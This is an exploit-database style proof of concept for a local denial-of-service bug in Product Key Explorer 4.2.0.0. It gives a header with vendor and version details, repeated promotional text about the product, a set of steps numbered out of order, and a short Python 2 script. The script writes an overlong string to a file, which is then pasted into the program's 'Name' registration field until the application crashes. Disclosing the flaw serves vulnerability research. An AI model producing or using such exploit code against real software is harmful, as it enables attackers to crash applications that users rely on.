# Exploit Title: Product Key Explorer 4.2.0.0 - 'Name' Denial of Service (POC)
# Discovery by: SajjadBnd
# Date: 2019-12-10
# Vendor Homepage: http://www.nsauditor.com
# Software Link: http://www.nsauditor.com/downloads/productkeyexplorer_setup.exe
# Tested Version: 4.2.0.0
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 - Pro
 
# [ About App ]
 
# Find product keys for over +9000 most popular programs: Windows 8.1, Windows 8, Windows 7, Vista,
# Windows 10, Microsoft Office, Adobe CS6, CS5, CS4 and CS3, Norton, Electronic Arts games, WinZip, Nero and more...
# Visit "Features" page to see all supported software list of programs with which product key finder works.
# Product Key Finder | Best Product Key Finder Software
# The Best Product Key Find and Recovery Software     
# Product key Explorer recovers product keys for software installed on your
# local and network computers, allows track the number of software licenses installed in your business.
# Product Key Finder | Best Product Key Finder Software
# The Best Product Key Find and Recovery Software     
# With Product Key Explorer you can recover lost product keys for all major software programs, prevent losing your investment and money!
# Product Key Finder | Best Product Key Finder Software
# The Best Product Key Find and Recovery Software     
# You can save product keys as Tab Delimited Txt File (.txt), Excel Workbook (.xls), CSV Comma Delimited (.csv),
# Access Database (.mdb), SQLLite3 Database, Web Page (.html) or XML Data (.xml) file, Print or Copy to Clipboard.
 

# [ POC ]
 
# 1.Run the python script, it will create a new file "dos.txt"
# 3.Run Product Key Explorer and click on "Register -> Enter Registration Code"
# 2.Paste the content of dos.txt into the Field: 'Name'
# 6.click 'ok'
# 5.Crashed ;)

#!/usr/bin/env python
buffer = "\x41" * 100
buffer += "\x42" * 100
buffer += "\x43" * 58
try:
    f = open("dos.txt","w")
    print "[+] Creating %s bytes DOS payload.." %len(buffer)
    f.write(buffer)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created"